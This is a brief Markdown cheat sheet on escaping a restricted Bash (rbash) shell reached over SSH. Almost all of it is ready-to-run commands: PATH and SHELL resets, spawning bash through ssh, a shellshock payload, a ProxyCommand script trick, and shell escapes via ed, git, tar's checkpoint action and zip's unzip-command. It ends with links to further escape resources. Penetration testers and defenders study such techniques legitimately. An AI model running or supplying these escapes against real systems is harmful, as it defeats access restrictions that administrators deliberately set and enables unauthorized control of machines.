# Breaking out of restricted Bash (rbash) CLI in SSH

### 1) Check available commands within rbash

    compgen -c 

### 2) Create PATH to have access to more binaries in the system

    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

## More escapes

### 3) Run SHELL variable as /bin/bash

    export SHELL=/bin/bash

### 4) Use SSH program

    ssh USER@IP 'bash --noprofile'
    ssh USER@IP - t "/bin/sh" or "/bin/bash"
    ssh user@IP -t "() { :; }; /bin/bash" (shellshock) 
    ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)

### 5) Ed

    ed
    !/bin/bash

### 6) Git

    git help status
    !/bin/bash

### 7) Tar

    tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

### 8) Zip

    zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

### 9) More resources

https://www.verylazytech.com/linux/bypassing-bash-restrictions-rbash

GTFOBins: https://gtfobins.github.io/

